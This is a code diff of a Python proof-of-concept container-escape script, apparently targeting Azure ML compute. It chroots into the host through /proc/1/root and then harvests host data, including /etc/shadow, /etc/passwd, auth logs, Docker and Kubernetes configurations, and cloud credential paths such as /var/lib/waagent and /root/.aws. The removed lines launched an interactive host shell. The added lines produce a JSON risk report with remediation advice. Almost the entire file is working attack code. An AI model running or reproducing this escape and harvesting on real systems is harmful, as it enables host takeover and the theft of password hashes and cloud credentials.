@@ -1,22 +1,26 @@
 #!/usr/bin/env python3
 """
-Container Escape with Comparative Reconnaissance PoC
-----------------------------------------------------
-This script collects baseline reconnaissance data from within the container,
-attempts a chroot escape into the host filesystem via /proc/1/root, then collects
-the same data from the host. Finally, it compares the two sets of results to
-confirm the escape and illustrate differences in impact.
-
+Comprehensive Container & Host Reconnaissance for Azure ML Compute
+-------------------------------------------------------------------
+This script performs the following steps:
+  1. Collects a full set of reconnaissance data from inside the container.
+  2. Attempts to escape the container by chrooting into /proc/1/root.
+  3. If successful, gathers the same data from the host.
+  4. Compares key differences between the container and host views.
+  5. Computes a risk score and outputs a JSON report.
+  
 CAUTION: Use only in authorized testing environments.
 """
 
 import os
 import subprocess
 import sys
+import json
+import socket
 from datetime import datetime
 
 def run_command(command, timeout=10):
-    """Run a shell command and return its output."""
+    """Execute a shell command and return its output."""
     try:
         result = subprocess.run(
             command, shell=True, check=False,
@@ -29,50 +33,19 @@ def run_command(command, timeout=10):
     except Exception as e:
         return f"Error: {str(e)}"
 
-def gather_recon_data(context="container"):
-    """
-    Gather a set of reconnaissance data.
-    context: A label used for reporting (e.g. 'container' or 'host').
-    Returns a dictionary with key information.
-    """
-    print(f"[*] Gathering {context} reconnaissance data...")
-    recon = {}
-    recon["Kernel & OS Info"] = run_command("uname -a")
-    recon["OS Release"] = run_command("cat /etc/os-release")
-    recon["Hostname"] = run_command("cat /etc/hostname")
-    recon["System Uptime"] = run_command("cat /proc/uptime")
-    recon["Mounted Filesystems"] = run_command("cat /proc/mounts")
-    recon["Active Network Connections"] = run_command("ss -tulnp")  # or netstat -tulnp if ss is unavailable
-    recon["Process Listing"] = run_command("ps aux")
-    return recon
-
-def print_comparison(container_data, host_data):
-    """
-    Compare container recon data to host recon data and print differences.
-    """
-    print("\n===== COMPARISON OF RECONNAISSANCE DATA =====")
-    keys = container_data.keys() & host_data.keys()
-    for key in sorted(keys):
-        print(f"\n--- {key} ---")
-        print("Inside Container:")
-        print(container_data[key] if container_data[key] else "[No data]")
-        print("\nFrom Host (post-escape):")
-        print(host_data[key] if host_data[key] else "[No data]")
-    print("==============================================\n")
-
 def check_escape_capabilities():
-    """Check if required privileges and access are present for escape."""
-    capabilities = {}
-    capabilities["proc_1_root_access"] = os.access("/proc/1/root", os.R_OK)
-    cap_info = run_command("capsh --print")
-    capabilities["cap_sys_admin"] = "cap_sys_admin" in cap_info.lower()
-    capabilities["is_root"] = (os.geteuid() == 0)
+    """Check if the container has privileges required for escape."""
+    capabilities = {
+        "proc_1_root_access": os.access("/proc/1/root", os.R_OK),
+        "cap_sys_admin": "cap_sys_admin" in run_command("capsh --print").lower(),
+        "is_root": (os.geteuid() == 0)
+    }
     print("[*] Escape Capability Check:")
     for k, v in capabilities.items():
         print(f"    {k}: {v}")
     return capabilities
 
-def escape_to_host():
+def attempt_escape():
     """
     Attempt to escape the container by chrooting into /proc/1/root.
     Returns True if escape is successful.
@@ -85,44 +58,241 @@ def escape_to_host():
     host_path = "/proc/1/root"
     test_file = os.path.join(host_path, "etc", "os-release")
     if not (os.path.exists(test_file) and os.access(test_file, os.R_OK)):
-        print("[-] Key host file (etc/os-release) is not accessible via /proc/1/root.")
+        print("[-] Cannot access key host file (etc/os-release). Escape aborted.")
         return False
 
     try:
         print("[*] Attempting chroot escape using /proc/1/root...")
         os.chroot(host_path)
-        os.chdir("/")  # change directory to new root
+        os.chdir("/")
         print("[+] chroot successful! Now operating in host filesystem context.")
         return True
     except Exception as e:
         print(f"[-] chroot escape failed: {e}")
         return False
 
+def enumerate_host_info():
+    """Collect basic system information."""
+    info = {
+        "Kernel & OS Info": run_command("uname -a"),
+        "OS Release": run_command("cat /etc/os-release"),
+        "Hostname": run_command("cat /etc/hostname"),
+        "System Uptime": run_command("cat /proc/uptime")
+    }
+    return info
+
+def enumerate_mounts():
+    """Retrieve mounted filesystem details."""
+    return run_command("cat /proc/mounts")
+
+def enumerate_sensitive_files():
+    """Attempt to read a set of sensitive files."""
+    sensitive = {}
+    for file_path in ["/etc/passwd", "/etc/shadow", "/etc/hosts"]:
+        try:
+            if os.path.exists(file_path) and os.access(file_path, os.R_OK):
+                with open(file_path, "r") as f:
+                    sensitive[file_path] = f.read()
+            else:
+                sensitive[file_path] = "Not accessible"
+        except Exception as e:
+            sensitive[file_path] = f"Error: {e}"
+    return sensitive
+
+def enumerate_network():
+    """Collect active network connections."""
+    # Use ss if available; otherwise fall back to netstat.
+    if run_command("which ss"):
+        return run_command("ss -tulnp")
+    else:
+        return run_command("netstat -tulnp")
+
+def enumerate_processes():
+    """List running processes."""
+    return run_command("ps aux")
+
+def enumerate_logs():
+    """Read portions of common log files (limit output for brevity)."""
+    logs = {}
+    for log_file in ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages"]:
+        if os.path.exists(log_file) and os.access(log_file, os.R_OK):
+            try:
+                with open(log_file, "r") as f:
+                    logs[log_file] = f.read(1024)  # Limit to 1KB per log
+            except Exception as e:
+                logs[log_file] = f"Error: {e}"
+        else:
+            logs[log_file] = "Not accessible"
+    return logs
+
+def enumerate_docker():
+    """List Docker container information, if available."""
+    docker_info = {}
+    if run_command("which docker"):
+        docker_info["docker_ps"] = run_command("docker ps -a")
+    else:
+        docker_info["docker_ps"] = "Docker not installed or not in PATH"
+    return docker_info
+
+def enumerate_kubernetes():
+    """Enumerate Kubernetes configurations if present."""
+    if os.path.isdir("/etc/kubernetes"):
+        return {"kube_configs": run_command("find /etc/kubernetes -type f")}
+    else:
+        return {"kube_configs": "Kubernetes configuration directory not found"}
+
+def enumerate_cloud_metadata():
+    """Check for Azure/AWS cloud metadata and configuration files."""
+    cloud = {}
+    # Azure-specific checks
+    cloud["waagent"] = run_command("find /var/lib/waagent -type f") if os.path.isdir("/var/lib/waagent") else "Not found"
+    cloud["azure_config"] = run_command("find /etc/azure -type f") if os.path.isdir("/etc/azure") else "Not found"
+    # AWS-specific (if any)
+    aws = {}
+    aws_path = "/root/.aws"
+    aws["root_aws"] = run_command(f"find {aws_path} -type f") if os.path.isdir(aws_path) else "Not found"
+    cloud["aws"] = aws
+    return cloud
+
+def gather_all_recon():
+    """Aggregate all reconnaissance data into a dictionary."""
+    data = {
+        "host_info": enumerate_host_info(),
+        "mounts": enumerate_mounts(),
+        "sensitive_files": enumerate_sensitive_files(),
+        "network": enumerate_network(),
+        "processes": enumerate_processes(),
+        "logs": enumerate_logs(),
+        "docker": enumerate_docker(),
+        "kubernetes": enumerate_kubernetes(),
+        "cloud": enumerate_cloud_metadata()
+    }
+    return data
+
+def compare_recon(container_data, host_data):
+    """
+    Compare selected keys from container and host recon data.
+    Returns a dictionary summarizing differences.
+    """
+    diff = {}
+    keys_to_compare = ["mounts", "sensitive_files", "docker", "kubernetes"]
+    for key in keys_to_compare:
+        diff[key] = {
+            "container": container_data.get(key),
+            "host": host_data.get(key)
+        }
+    return diff
+
+def compute_risk_score(container_data, host_data, escape_success):
+    """
+    Compute a simple risk score based on:
+      - Whether escape was achieved.
+      - Accessibility of sensitive files (e.g. /etc/shadow).
+      - Presence of additional host mounts or cloud configurations.
+    Returns a score (integer) and a risk level ("Low", "Medium", "High").
+    """
+    score = 0
+
+    # Base risk if escape was achieved.
+    if escape_success:
+        score += 5
+
+    # Increase risk if /etc/shadow is accessible.
+    shadow_access = host_data.get("sensitive_files", {}).get("/etc/shadow", "Not accessible")
+    if "Not accessible" not in shadow_access and "Error" not in shadow_access:
+        score += 5
+
+    # Compare mounts: if host mounts reveal device info not present in container, add risk.
+    container_mounts = container_data.get("mounts", "")
+    host_mounts = host_data.get("mounts", "")
+    if container_mounts != host_mounts:
+        score += 3
+
+    # Cloud configurations: if host reveals cloud-specific configs, add risk.
+    if host_data.get("cloud", {}).get("azure_config", "Not found") != "Not found":
+        score += 2
+
+    # Docker info: if host shows Docker container details (and container did not), add risk.
+    if host_data.get("docker", {}).get("docker_ps", "").strip() and "not in PATH" not in host_data.get("docker", {}).get("docker_ps", ""):
+        score += 2
+
+    # Determine risk level.
+    if score >= 10:
+        level = "High"
+    elif score >= 5:
+        level = "Medium"
+    else:
+        level = "Low"
+
+    return score, level
+
 def main():
-    print("==== Container Escape with Comparative Recon PoC ====")
-    print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    report = {
+        "timestamp": start_time,
+        "hostname": socket.gethostname(),
+        "escape_capabilities": check_escape_capabilities(),
+        "escape_success": False,
+        "container_recon": {},
+        "host_recon": {},
+        "comparison": {},
+        "risk_assessment": {}
+    }
+
+    print("==== Comprehensive Security Risk Evaluation ====")
+    print(f"Started at: {start_time}")
     print("CAUTION: This script is for authorized testing only.\n")
+
+    # 1. Gather reconnaissance data from inside the container.
+    print("[+] Gathering reconnaissance data from inside the container...")
+    container_data = gather_all_recon()
+    report["container_recon"] = container_data
+
+    # 2. Attempt to escape the container.
+    print("\n[+] Attempting container escape via chroot...")
+    escape_success = attempt_escape()
+    report["escape_success"] = escape_success
+
+    # 3. If escape is successful, gather host reconnaissance data.
+    if escape_success:
+        print("\n[+] Gathering reconnaissance data from the host (post-escape)...")
+        host_data = gather_all_recon()
+        report["host_recon"] = host_data
+    else:
+        print("[-] Container escape failed; host reconnaissance cannot be performed.")
+        host_data = {}
+
+    # 4. Compare container and host data.
+    report["comparison"] = compare_recon(container_data, host_data)
+
+    # 5. Compute risk score.
+    score, level = compute_risk_score(container_data, host_data, escape_success)
+    report["risk_assessment"] = {
+        "risk_score": score,
+        "risk_level": level,
+        "recommendations": (
+            "High risk: Immediate review of container privileges, "
+            "isolation boundaries, and runtime configurations is required. "
+            "Drop CAP_SYS_ADMIN, restrict host mount exposure, and apply "
+            "strict seccomp/AppArmor/SELinux policies." if level == "High" else
+            "Medium risk: Review container runtime and network configurations "
+            "to further isolate workloads." if level == "Medium" else
+            "Low risk: Security posture appears acceptable, but continuous monitoring is recommended."
+        )
+    }
+
+    # 6. Output the full report as JSON.
+    final_report = json.dumps(report, indent=2)
+    print("\n===== FINAL SECURITY REPORT =====")
+    print(final_report)
     
-    # 1. Gather baseline data inside the container.
-    container_recon = gather_recon_data(context="container")
-    
-    # 2. Attempt container escape via chroot.
-    if not escape_to_host():
-        print("[-] Container escape failed. Exiting.")
-        sys.exit(1)
-    
-    # 3. Once escaped, gather host recon data.
-    host_recon = gather_recon_data(context="host")
-    
-    # 4. Print a comparison report.
-    print_comparison(container_recon, host_recon)
-    
-    # 5. Confirm proof-of-concept with an interactive shell if needed.
+    # Optionally, write the report to a file.
     try:
-        print("[+] Launching interactive shell on the host (type 'exit' to quit)...")
-        os.execvp("/bin/bash", ["/bin/bash"])
+        with open("security_report.json", "w") as f:
+            f.write(final_report)
+        print("\n[+] Report written to security_report.json")
     except Exception as e:
-        print(f"[-] Failed to launch interactive shell: {e}")
+        print(f"[-] Failed to write report to file: {e}")
 
 if __name__ == "__main__":
     main()
